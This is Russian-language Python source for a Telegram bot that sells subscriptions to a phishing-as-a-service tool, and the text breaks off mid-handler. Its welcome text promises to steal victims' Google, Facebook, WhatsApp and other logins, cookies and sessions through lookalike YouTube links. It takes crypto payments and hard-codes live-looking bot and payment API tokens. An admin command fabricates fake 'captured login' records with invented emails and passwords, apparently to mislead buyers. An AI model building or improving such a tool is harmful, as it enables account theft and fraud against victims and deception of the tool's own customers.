import logging
import aiohttp
import os
import asyncio
import random
import string
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import datetime
import hashlib

# Определяем директорию где находится код
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# --- НАСТРОЙКИ ---
API_TOKEN = '8514518192:AAFC2lbIxC8l2VgYUZVUA9Eb3izVWLG_-nY'
CRYPTO_PAY_TOKEN = '526811:AAatyx14fjIZ6GitsEvGO2CO72qBnNyHdIS'
ADMIN_ID = 8524326478

# Цены за подписки
SUBSCRIPTION_PRICES = {
    'start': 200,      # Начальная подписка - 200 рублей
    'basic': 500,      # Базовая подписка
    'pro': 1500,       # Pro подписка
    'premium': 5000    # Premium подписка
}

# Ограничения для подписок
SUBSCRIPTION_LIMITS = {
    'start': {
        'links': 30,            # 30 ссылок
        'lifetime': 7,          # 7 дней
        'link_lifetime': "1 день",  # Время жизни ссылок
        'features': [
            'Пробный период (30 ссылок)',
            'Низкая скорость генерации',
            'Базовый анти-детект',
            'Поддержка только YouTube',
            'Хранение данных 1 день'
        ]
    },
    'basic': {
        'links': 100,           # 100 ссылок
        'lifetime': 30,         # 30 дней
        'link_lifetime': "2-3 дня",  # Время жизни ссылок
        'features': [
            'Ограниченная генерация (100 ссылок)',
            'Стандартная скорость',
            'Базовый анти-детект',
            'Поддержка только YouTube',
            'Хранение данных 7 дней'
        ]
    },
    'pro': {
        'links': 500,           # 500 ссылок
        'lifetime': 90,         # 90 дней
        'link_lifetime': "5-7 дней",  # Время жизни ссылок
        'features': [
            'Улучшенная генерация (500 ссылок)',
            'Высокая скорость',
            'Продвинутый анти-детект',
            'Поддержка YouTube и соцсетей',
            'Хранение данных 30 дней',
            'Приоритетная очередь'
        ]
    },
    'premium': {
        'links': '∞',           # Безлимит
        'lifetime': 365,        # 365 дней
        'link_lifetime': "14-30+ дней",  # Время жизни ссылок
        'features': [
            'Безлимитная генерация ссылок',
            'Максимальная скорость',
            'Элитный анти-детект',
            'Поддержка всех платформ',
            'Вечное хранение данных',
            'Максимальный приоритет',
            'Персональная поддержка',
            'Кастомные домены'
        ]
    }
}

# ============================================
# БАЗА ДАННЫХ ДЛЯ ГЕНЕРАЦИИ ФЕЙКОВЫХ ЛОГИНОВ
# ============================================

# Список моделей телефонов Xiaomi (100+ вариантов)
XIAOMI_MODELS = [
    "Redmi 9A", "Redmi 9C", "Redmi 9T", "Redmi Note 9", "Redmi Note 9S", "Redmi Note 9 Pro",
    "Redmi 10", "Redmi 10C", "Redmi 10A", "Redmi Note 10", "Redmi Note 10S", "Redmi Note 10 Pro", "Redmi Note 10 Lite",
    "Redmi 11", "Redmi 11 Prime", "Redmi Note 11", "Redmi Note 11S", "Redmi Note 11 Pro", "Redmi Note 11 Pro+",
    "Redmi 12", "Redmi 12C", "Redmi Note 12", "Redmi Note 12S", "Redmi Note 12 Pro", "Redmi Note 12 Pro+", "Redmi Note 12 Turbo",
    "Redmi 13C", "Redmi Note 13", "Redmi Note 13 Pro", "Redmi Note 13 Pro+",
    "Mi 9", "Mi 9T", "Mi 9 Lite", "Mi 9 SE",
    "Mi 10", "Mi 10T", "Mi 10T Lite", "Mi 10 Pro", "Mi 10 Lite",
    "Mi 11", "Mi 11T", "Mi 11T Pro", "Mi 11 Lite", "Mi 11 Lite 5G", "Mi 11 Pro", "Mi 11 Ultra",
    "Mi 12", "Mi 12T", "Mi 12T Pro", "Mi 12 Lite", "Mi 12 Pro",
    "Mi 13", "Mi 13T", "Mi 13T Pro", "Mi 13 Lite", "Mi 13 Pro",
    "Poco F1", "Poco F2 Pro", "Poco F3", "Poco F4", "Poco F5", "Poco F5 Pro",
    "Poco X2", "Poco X3", "Poco X3 NFC", "Poco X3 Pro", "Poco X4", "Poco X4 Pro", "Poco X5", "Poco X5 Pro",
    "Poco M2", "Poco M2 Pro", "Poco M3", "Poco M4", "Poco M4 Pro", "Poco M5", "Poco M5s",
    "Poco C3", "Poco C4", "Poco C40", "Poco C50",
    "Black Shark", "Black Shark 2", "Black Shark 3", "Black Shark 4", "Black Shark 5",
    "Mi Mix 3", "Mi Mix Alpha", "Mi Mix Fold", "Mi Mix Fold 2", "Mi Mix Fold 3",
    "Mi Max 2", "Mi Max 3", "Mi Max 4",
    "Mi Note 10", "Mi Note 10 Pro", "Mi Note 11", "Mi Note 12"
]

# Список доменов для email
EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru", "yandex.ru", "bk.ru", 
    "list.ru", "inbox.ru", "icloud.com", "proton.me", "aol.com", "zoho.com", "gmx.com", "yandex.ua"
]

# Список имен для логинов
NAMES = [
    "vladimir", "alexey", "dmitry", "nikolay", "sergey", "andrey", "ivan", "mikhail", "artem", 
    "maxim", "denis", "kirill", "pavel", "egor", "roman", "viktor", "oleg", "ruslan", "evgeny",
    "alexander", "konstantin", "valery", "vladislav", "timur", "ilya", "nikita", "vadim", "anton",
    "albert", "arseny", "boris", "vitaly", "georgy", "danil", "zakhar", "yury", "leonid", "matvey",
    "petr", "svyatoslav", "stanislav", "stepan", "fedor", "edward", "yakov", "alena", "anna",
    "elena", "maria", "olga", "tatyana", "ekaterina", "nadezhda", "ludmila", "svetlana"
]

# Список стран и кодов операторов
PHONE_CODES = [
    {"country": "RU", "code": "+7", "operators": ["900", "901", "902", "903", "904", "905", "906", "908", "909", 
                                                  "910", "911", "912", "913", "914", "915", "916", "917", "918", "919",
                                                  "920", "921", "922", "923", "924", "925", "926", "927", "928", "929",
                                                  "930", "931", "932", "933", "934", "935", "936", "937", "938", "939",
                                                  "950", "951", "952", "953", "954", "955", "956", "958", "960", "961",
                                                  "962", "963", "964", "965", "966", "967", "968", "969"]},
    {"country": "UA", "code": "+380", "operators": ["50", "63", "66", "67", "68", "73", "91", "92", "93", "94", "95", "96", "97", "98", "99"]},
    {"country": "KZ", "code": "+7", "operators": ["700", "701", "702", "705", "707", "708", "710", "771", "775", "776", "777", "778"]},
    {"country": "BY", "code": "+375", "operators": ["25", "29", "33", "44"]}
]

# Список соцсетей для привязки
SOCIAL_NETWORKS = [
    "Facebook", "Instagram", "Twitter", "WhatsApp", "Viber", "Telegram", "TikTok", 
    "Snapchat", "LinkedIn", "Pinterest", "Discord", "Twitch", "Reddit", "YouTube",
    "WeChat", "QQ", "Qzone", "Line", "VK", "Odnoklassniki"
]

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Хранилище (в памяти)
user_balances = {}  # {user_id: баланс}
user_data_store = {}  # {user_id: данные пользователя}
user_generated_links = {}  # Сгенерированные ссылки пользователей
user_subscriptions = {}  # {user_id: {'type': тип, 'expiry': дата окончания, 'links_used': использовано, 'links_limit': лимит}}
pending_payments = {}  # {user_id: {'subscription_type': тип, 'invoice_id': id}}

# FSM для состояний
class UserStates(StatesGroup):
    waiting_for_youtube_url = State()
    waiting_for_amount = State()

# ============================================
# ФУНКЦИИ ГЕНЕРАЦИИ ФЕЙКОВЫХ ДАННЫХ
# ============================================

def generate_serial():
    """Генерирует серийный номер для Xiaomi"""
    prefix = random.choice(["H", "V", "M", "K", "L", "P", "R", "S", "T", "W", "X", "Y", "Z"])
    number = ''.join(random.choices(string.digits, k=random.randint(5, 8)))
    return f"{prefix}{number}"

def generate_dpp():
    """Генерирует DPP код"""
    prefix = random.choice(["E", "F", "G", "H", "K", "L", "M", "N", "P", "R", "S", "T", "W", "X", "Y", "Z"])
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=random.randint(4, 5)))
    return f"{prefix}{suffix}"

def generate_email():
    """Генерирует случайный email"""
    name = random.choice(NAMES)
    surname = random.choice(NAMES)
    number = ''.join(random.choices(string.digits, k=random.randint(1, 3)))
    domain = random.choice(EMAIL_DOMAINS)
    
    variants = [
        f"{name}.{surname}",
        f"{name}{surname}",
        f"{name}{number}",
        f"{name}.{number}",
        f"{surname}.{name}",
        f"{name}_{surname}",
        f"{name}",
        f"{surname}{number}"
    ]
    
    local_part = random.choice(variants)
    return f"{local_part}@{domain}"

def generate_password():
    """Генерирует случайный пароль"""
    patterns = [
        lambda: f"{random.choice(string.digits)}{random.choice(string.digits)}{''.join(random.choices(string.ascii_lowercase, k=4))}{random.choice(string.digits)}{random.choice(string.digits)}",
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=4))}{random.randint(10, 99)}",
        lambda: f"{random.choice(string.ascii_uppercase)}{''.join(random.choices(string.ascii_lowercase, k=5))}{random.randint(10, 99)}",
        lambda: f"{random.randint(100, 999)}{''.join(random.choices(string.ascii_lowercase, k=3))}",
        lambda: f"{random.choice(string.ascii_uppercase)}{random.choice(string.digits)}{random.choice(string.ascii_lowercase)}{random.choice(string.digits)}{random.choice(string.ascii_lowercase)}{random.choice(string.digits)}",
        lambda: f"{random.randint(1000, 9999)}"
    ]
    
    return random.choice(patterns)()

def generate_phone():
    """Генерирует случайный номер телефона"""
    country = random.choice(PHONE_CODES)
    operator = random.choice(country["operators"])
    
    if country["code"] == "+7" and len(operator) == 3:  # Россия/Казахстан
        number = ''.join(random.choices(string.digits, k=7))
        return f"{country['code']}{operator}{number}"
    else:  # Украина, Беларусь и др.
        number = ''.join(random.choices(string.digits, k=7))
        return f"{country['code']}{operator}{number}"

def generate_social_networks():
    """Генерирует случайный набор привязанных соцсетей"""
    networks = []
    
    # От 1 до 4 соцсетей
    num_networks = random.randint(1, 4)
    selected = random.sample(SOCIAL_NETWORKS, num_networks)
    
    for network in selected:
        # С вероятностью 30% соцсеть есть, но логин не указан
        if random.random() < 0.3:
            networks.append(f"[{network}] - логин не указан")
        else:
            username = random.choice(NAMES)
            if random.random() < 0.5:
                username += ''.join(random.choices(string.digits, k=random.randint(1, 3)))
            
            # С вероятностью 40% пароль скрыт
            if random.random() < 0.4:
                password = "*" * random.randint(6, 10)
            else:
                password = generate_password()
            
            networks.append(f"[{network}] - {username}\n[password] - {password}")
    
    return networks

def generate_fake_login():
    """Генерирует полный фейковый логин"""
    # Выбираем случайную модель телефона
    phone_model = random.choice(XIAOMI_MODELS)
    
    # Генерируем серийный номер
    serial = generate_serial()
    
    # Генерируем DPP
    dpp = generate_dpp()
    
    # Генерируем email и пароль
    email = generate_email()
    email_password = generate_password()
    
    # Генерируем набор соцсетей
    social_networks = generate_social_networks()
    
    # С вероятностью 70% генерируем телефон
    phone = None
    if random.random() < 0.7:
        phone = generate_phone()
    
    return {
        "phone_model": phone_model,
        "serial": serial,
        "dpp": dpp,
        "email": email,
        "email_password": email_password,
        "phone": phone,
        "social_networks": social_networks
    }

# --- ФУНКЦИИ CRYPTOBOT ---

async def create_crypto_invoice(amount_rub, description):
    """Создает счет в CryptoBot на сумму в рублях"""
    url = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "amount": str(amount_rub),
        "fiat": "RUB",
        "currency_type": "fiat",
        "accepted_assets": "USDT,TON,BTC,ETH,LTC,BNB",
        "description": description,
        "allow_comments": False,
        "expires_in": 3600
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data['result']['pay_url'], data['result']['invoice_id']
                else:
                    logging.error(f"Ошибка CryptoBot API: {await resp.text()}")
                    return None, None
    except Exception as e:
        logging.error(f"Ошибка при создании инвойса: {e}")
        return None, None

async def check_crypto_payment(invoice_id):
    """Проверяет статус оплаты счета в CryptoBot"""
    url = f"https://pay.crypt.bot/api/getInvoices"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "invoice_ids": invoice_id
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, params=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data['result']['items']:
                        invoice = data['result']['items'][0]
                        return invoice['status'] == 'paid'
                return False
    except Exception as e:
        logging.error(f"Ошибка при проверке оплаты: {e}")
        return False

def generate_phishing_link(youtube_url, user_id):
    """Генерирует фишинг ссылку из YouTube URL"""
    # Проверяем активную подписку
    if user_id not in user_subscriptions:
        return None, "❌ У вас нет активной подписки!"
    
    subscription = user_subscriptions[user_id]
    
    # Проверяем срок действия
    expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
    if datetime.datetime.now() > expiry_date:
        return None, "❌ Ваша подписка истекла!"
    
    # Проверяем лимит ссылок
    if subscription['links_limit'] != '∞' and subscription['links_used'] >= subscription['links_limit']:
        return None, f"❌ Лимит ссылок исчерпан ({subscription['links_used']}/{subscription['links_limit']})!"
    
    # Создаем уникальный ID на основе URL и user_id
    unique_id = hashlib.md5(f"{youtube_url}{user_id}{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
    
    # Генерируем фишинг-ссылку
    phishing_domain = "youtube-premium-access.com"
    phishing_path = f"/watch/v={unique_id}"
    
    phishing_url = f"https://{phishing_domain}{phishing_path}"
    
    # Сохраняем в истории пользователя
    if user_id not in user_generated_links:
        user_generated_links[user_id] = []
    
    user_generated_links[user_id].append({
        'original': youtube_url,
        'phishing': phishing_url,
        'timestamp': datetime.datetime.now().strftime("%d.%m.%Y %H:%M"),
        'clicks': 0,
        'data_captured': []
    })
    
    # Увеличиваем счетчик использованных ссылок
    subscription['links_used'] += 1
    
    return phishing_url, None

# ============================================
# ФУНКЦИИ РАБОТЫ С ФАЙЛАМИ И КАРТИНКАМИ
# ============================================

def get_image_path(filename):
    """Возвращает полный путь к файлу изображения"""
    return os.path.join(BASE_DIR, filename)

def image_exists(filename):
    """Проверяет существование файла изображения"""
    return os.path.exists(get_image_path(filename))

async def send_photo_or_text(chat_id, image_filename, caption, reply_markup=None):
    """
    Универсальная функция отправки фото или текста
    Если фото не найдено, отправляет текстовое сообщение
    """
    try:
        # Проверяем существование файла
        full_path = get_image_path(image_filename)
        logging.info(f"Пытаюсь отправить фото: {full_path}")
        
        if os.path.exists(full_path):
            logging.info(f"Файл найден, размер: {os.path.getsize(full_path)} байт")
            # Используем FSInputFile для создания объекта файла
            photo = FSInputFile(full_path)
            
            return await bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=caption,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        else:
            logging.warning(f"Файл {full_path} не найден")
    except Exception as e:
        logging.error(f"Ошибка при отправке фото {image_filename}: {e}", exc_info=True)
    
    # Если фото не найдено или ошибка, отправляем текстовое сообщение
    logging.info(f"Отправляю текстовое сообщение вместо фото: {image_filename}")
    return await bot.send_message(
        chat_id=chat_id,
        text=caption,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def delete_and_send_photo(chat_id, message_id, photo_path, caption, markup=None):
    """Удаляет старое сообщение и шлет новое с фото"""
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await send_photo_or_text(chat_id, photo_path, caption, markup)

# --- КЛАВИАТУРЫ ---

def get_main_keyboard():
    """Основная клавиатура с двумя кнопками"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💎 Купить подписку", callback_data="show_subscriptions")],
            [InlineKeyboardButton(text="💬 Поддержка", url="https://t.me/pabg_prodazha")]
        ]
    )
    return keyboard

def get_subscriptions_keyboard():
    """Клавиатура выбора подписки"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"🌟 START - {SUBSCRIPTION_PRICES['start']} ₽ (пробная)", callback_data="subscription_start")],
            [InlineKeyboardButton(text=f"🎯 Базовая - {SUBSCRIPTION_PRICES['basic']} ₽", callback_data="subscription_basic")],
            [InlineKeyboardButton(text=f"🚀 Pro - {SUBSCRIPTION_PRICES['pro']} ₽", callback_data="subscription_pro")],
            [InlineKeyboardButton(text=f"🏆 Premium - {SUBSCRIPTION_PRICES['premium']} ₽", callback_data="subscription_premium")],
            [InlineKeyboardButton(text="« Назад", callback_data="back_to_main")]
        ]
    )
    return keyboard

def get_subscription_details_keyboard(subscription_type):
    """Клавиатура с опциями покупки подписки"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"💎 Купить через CryptoBot", callback_data=f"buy_crypto_{subscription_type}")],
            [InlineKeyboardButton(text=f"💳 Купить картой (Админ)", callback_data=f"buy_card_{subscription_type}")],
            [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

def get_admin_payment_keyboard(subscription_type):
    """Клавиатура для оплаты через администратора"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 Написать админу", url="https://t.me/pabg_prodazha")],
            [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

def get_invoice_keyboard(subscription_type, invoice_id):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить в CryptoBot", callback_data=f"open_invoice_{invoice_id}")],
            [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}")],
            [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

async def delete_and_send(chat_id, message_id, text, markup=None):
    """Удаляет старое сообщение и шлет новое"""
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await bot.send_message(chat_id, text, reply_markup=markup, parse_mode='HTML')

def get_user_data(user_id):
    """Получает данные пользователя"""
    if user_id not in user_data_store:
        user_data_store[user_id] = {
            'name': f"Пользователь #{user_id % 10000:04d}",
            'id': str(user_id),
            'balance': user_balances.get(user_id, 0),
            'reg_date': datetime.datetime.now().strftime("%d.%m.%Y"),
            'total_spent': 0,
            'purchases_count': 0,
            'total_links': 0
        }
    return user_data_store[user_id]

def get_user_balance(user_id):
    """Получает баланс пользователя"""
    return user_balances.get(user_id, 0)

def get_subscription_info(user_id):
    """Получает информацию о подписке пользователя"""
    if user_id in user_subscriptions:
        subscription = user_subscriptions[user_id]
        expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
        days_left = (expiry_date - datetime.datetime.now()).days
        
        return {
            'type': subscription['type'],
            'expiry': subscription['expiry'],
            'days_left': max(0, days_left),
            'links_used': subscription['links_used'],
            'links_limit': subscription['links_limit']
        }
    return None

def format_bold_text(text):
    """Форматирует весь текст жирным шрифтом"""
    # Удаляем существующие теги <b> и </b>
    text = text.replace('<b>', '').replace('</b>', '')
    # Оборачиваем весь текст в теги <b>
    return f"<b>{text}</b>"

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    welcome_text = format_bold_text("""
🚀 ФИШИНГ БОТ ДЛЯ СКАМА МАМОНТОВ И ЖЕРТВ

🎯 ПРОФЕССИОНАЛЬНЫЙ ИНСТРУМЕНТ ДЛЯ КРАЖИ ДАННЫХ:

⚡ КАК ЭТО РАБОТАЕТ:

1️⃣ Бот создает фишинг ссылку из YouTube URL
2️⃣ Вы отправляете ссылку жертве (мамонту)
3️⃣ Жертва переходит по ссылке
4️⃣ Бот автоматически ворует все данные:

🔐 КРАДУТСЯ ДАННЫЕ:
• Google/Gmail аккаунты
• Facebook профили
• Twitter (X) логины
• WhatsApp данные
• Номера телефонов
• Данные устройства
• Cookies и сессии

💰 ПОСЛЕ ПОЛУЧЕНИЯ ДАННЫХ:
• Входите в аккаунты жертвы
• Меняете пароли
• Получаете полный контроль
• Используете для своих целей

🛡️ ПРЕИМУЩЕСТВА БОТА:
• Полная автоматизация
• Не требует действий от жертвы
• Максимальная скрытность
• Данные в реальном времени
• Работает через любой YouTube URL

💎 ДЛЯ НАЧАЛА РАБОТЫ:
Купите подписку и начните скам мамонтов уже сегодня!
🌟 Доступна пробная START подписка всего за 200 ₽!
""")
    
    # Отправляем сообщение с картинкой
    await send_photo_or_text(message.chat.id, "photo1.png", welcome_text, get_main_keyboard())

# --- КОМАНДА ДЛЯ АДМИНИСТРАТОРА /create ---

@dp.message(Command("create"))
async def cmd_create(message: types.Message):
    """Генерирует фейковый логин (только для администратора)"""
    # Проверяем, является ли пользователь администратором
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔ У вас нет прав на выполнение этой команды.")
        return
    
    # Генерируем 2 случайных фейковых логина
    login1 = generate_fake_login()
    login2 = generate_fake_login()
    
    # Формируем текст для первого логина
    text1 = f"""<b>New log-in #1</b>

{{Phone}} - Xiaomi {login1['phone_model']}
{{Serial number}} - {login1['serial']}
-
[DPP] - {login1['dpp']}

[E-mail] - {login1['email']}
[password] - {login1['email_password']}"""

    # Добавляем соцсети для первого логина
    for network in login1['social_networks']:
        text1 += f"\n\n{network}"
    
    # Добавляем телефон если есть
    if login1['phone']:
        text1 += f"\n\n[WhatsApp] - {login1['phone']}"
    
    text1 += "\n\n<b>No data found yet</b>"
    
    # Формируем текст для второго логина
    text2 = f"""<b>New log-in #2</b>

{{Phone}} - Xiaomi {login2['phone_model']}
{{Serial number}} - {login2['serial']}
-
[DPP] - {login2['dpp']}

[E-mail] - {login2['email']}
[password] - {login2['email_password']}"""

    # Добавляем соцсети для второго логина
    for network in login2['social_networks']:
        text2 += f"\n\n{network}"
    
    # Добавляем телефон если есть
    if login2['phone']:
        text2 += f"\n\n[WhatsApp] - {login2['phone']}"
    
    text2 += "\n\n<b>No data found yet</b>"
    
    # Отправляем оба сообщения
    await message.answer(text1, parse_mode='HTML')
    await message.answer(text2, parse_mode='HTML')

# --- CALLBACK ОБРАБОТЧИКИ ---

@dp.callback_query(lambda callback_query: callback_query.data == 'back_to_main')
async def back_to_main(callback_query: types.CallbackQuery):
    welcome_text = format_bold_text("""
🚀 ФИШИНГ БОТ ДЛЯ СКАМА МАМОНТОВ И ЖЕРТВ

🎯 ПРОФЕССИОНАЛЬНЫЙ ИНСТРУМЕНТ ДЛЯ КРАЖИ ДАННЫХ:

⚡ КАК ЭТО РАБОТАЕТ:

1️⃣ Бот создает фишинг ссылку из YouTube URL
2️⃣ Вы отправляете ссылку жертве (мамонту)
3️⃣ Жертва переходит по ссылке
4️⃣ Бот автоматически ворует все данные:

🔐 КРАДУТСЯ ДАННЫЕ:
• Google/Gmail аккаунты
• Facebook профили
• Twitter (X) логины
• WhatsApp данные
• Номера телефонов
• Данные устройства
• Cookies и сессии

💰 ПОСЛЕ ПОЛУЧЕНИЯ ДАННЫХ:
• Входите в аккаунты жертвы
• Меняете пароли
• Получаете полный контроль
• Используете для своих целей

🛡️ ПРЕИМУЩЕСТВА БОТА:
• Полная автоматизация
• Не требует действий от жертвы
• Максимальная скрытность
• Данные в реальном времени
• Работает через любой YouTube URL

💎 ДЛЯ НАЧАЛА РАБОТЫ:
Купите подписку и начните скам мамонтов уже сегодня!
🌟 Доступна пробная START подписка всего за 200 ₽!
""")
    
    # Используем новую функцию для отправки фото
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo1.png", welcome_text, get_main_keyboard())
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'show_subscriptions')
async def show_subscriptions(callback_query: types.CallbackQuery):
    text = format_bold_text("""
💎 ВЫБЕРИТЕ ПОДПИСКУ ДЛЯ ФИШИНГА

Доступно 4 уровня подписок для скама мамонтов:



👇 Выберите подписку для покупки:
""")
    
    # Используем новую функцию для отправки фото
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo3.png", text, get_subscriptions_keyboard())
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('subscription_'))
async def subscription_details(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('subscription_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        limits = SUBSCRIPTION_LIMITS[subscription_type]
        
        subscription_names = {
            'start': '🌟 START ПОДПИСКА (ПРОБНАЯ)',
            'basic': '🎯 БАЗОВАЯ ПОДПИСКА',
            'pro': '🚀 PRO ПОДПИСКА',
            'premium': '🏆 PREMIUM ПОДПИСКА'
        }
        
        text = format_bold_text(f"""
{subscription_names[subscription_type]}

💰 Цена: {price} ₽
🔗 Лимит ссылок: {limits['links']}
⏱️ Срок действия: {limits['lifetime']} дней
⏳ Время жизни ссылок: {limits['link_lifetime']}

✨ Включенные функции:
""")
        
        for feature in limits['features']:
            text += format_bold_text(f"• {feature}\n")
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                             text, get_subscription_details_keyboard(subscription_type))
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_crypto_'))
async def buy_subscription_crypto(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('buy_crypto_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        user_id = callback_query.from_user.id
        
        await callback_query.answer("Создаем счет для оплаты...")
        
        description = f"Оплата {subscription_type} подписки Фишинг Бота"
        pay_url, invoice_id = await create_crypto_invoice(price, description)
        
        if pay_url and invoice_id:
            # Сохраняем информацию о платеже
            pending_payments[user_id] = {
                'subscription_type': subscription_type,
                'invoice_id': invoice_id,
                'amount': price,
                'payment_method': 'crypto'
            }
            
            invoice_text = format_bold_text(f"""
✅ СЧЕТ ДЛЯ ОПЛАТЫ СОЗДАН

💰 Сумма: {price} ₽
💎 Подписка: {subscription_type.upper()}
💳 Способ оплаты: CryptoBot
⏱️ Действителен: 60 минут

🔒 Безопасная оплата через CryptoBot:
• USDT (TRC20/ERC20) • TON • BTC
• ETH • LTC • BNB

🎁 После оплаты:
1. Подписка активируется автоматически
2. Вы получите уведомление
3. Сможете создавать фишинг ссылки

📞 При проблемах с оплатой: @pabg_prodazha
""")
            
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="💳 Оплатить в CryptoBot", url=pay_url)],
                    [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}")],
                    [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
                ]
            )
            
            # Используем новую функцию для отправки фото
            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                      "photo8.png", invoice_text, markup)
            
        else:
            await callback_query.answer("⚠️ Ошибка при создании счета. Попробуйте позже.", show_alert=True)
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_card_'))
async def buy_subscription_card(callback_query: types.CallbackQuery):
    """Обработчик покупки подписки картой через администратора"""
    subscription_type = callback_query.data.replace('buy_card_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        
        subscription_names = {
            'start': 'START (пробная)',
            'basic': 'BASIC',
            'pro': 'PRO',
            'premium': 'PREMIUM'
        }
        
        card_text = format_bold_text(f"""
💳 Оплата картой

💰 {price} ₽ за подписку {subscription_names[subscription_type]}

1. Жмите кнопку ниже
2. Пишите админу "Хочу {subscription_names[subscription_type]} подписку в фишинг боте"
3. Оплачивайте на карту
4. Скидываете скриншот оплаты
5. Через 5-15 мин у вас все работает

👨‍💻 Админ: @pabg_prodazha
""")
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                            card_text, get_admin_payment_keyboard(subscription_type))
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('check_payment_'))
async def check_payment(callback_query: types.CallbackQuery):
    invoice_id = callback_query.data.replace('check_payment_', '')
    user_id = callback_query.from_user.id
    
    # Проверяем, есть ли такой ожидающий платеж
    if user_id in pending_payments and pending_payments[user_id]['invoice_id'] == invoice_id:
        # Проверяем оплату через CryptoBot API
        is_paid = await check_crypto_payment(invoice_id)
        
        if is_paid:
            # Активируем подписку
            subscription_type = pending_payments[user_id]['subscription_type']
            lifetime = SUBSCRIPTION_LIMITS[subscription_type]['lifetime']
            expiry_date = (datetime.datetime.now() + datetime.timedelta(days=lifetime)).strftime("%Y-%m-%d")
            
            # Активируем подписку
            user_subscriptions[user_id] = {
                'type': subscription_type,
                'expiry': expiry_date,
                'links_used': 0,
                'links_limit': SUBSCRIPTION_LIMITS[subscription_type]['links']
            }
            
            # Обновляем данные пользователя
            user_data = get_user_data(user_id)
            user_data['purchases_count'] += 1
            user_data['total_spent'] += SUBSCRIPTION_PRICES[subscription_type]
            
            # Удаляем из ожидающих платежей
            del pending_payments[user_id]
            
            subscription_names = {
                'start': 'START (пробная)',
                'basic': 'BASIC',
                'pro': 'PRO',
                'premium': 'PREMIUM'
            }
            
            success_text = format_bold_text(f"""
✅ ПОДПИСКА АКТИВИРОВАНА!

💎 Тип подписки: {subscription_names[subscription_type]}
⏱️ Действует до: {expiry_date}
🔗 Лимит ссылок: {SUBSCRIPTION_LIMITS[subscription_type]['links']}
⏳ Время жизни ссылок: {SUBSCRIPTION_LIMITS[subscription_type]['link_lifetime']}

🎉 Теперь вы можете:
1. Создавать фишинг-ссылки для скама мамонтов
2. Отправлять их жертвам
3. Собирать данные автоматически
4. Воровать аккаунты и данные

👇 Начните работу прямо сейчас!
""")
            
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="💎 Главное меню", callback_data="back_to_main")]
                ]
            )
            
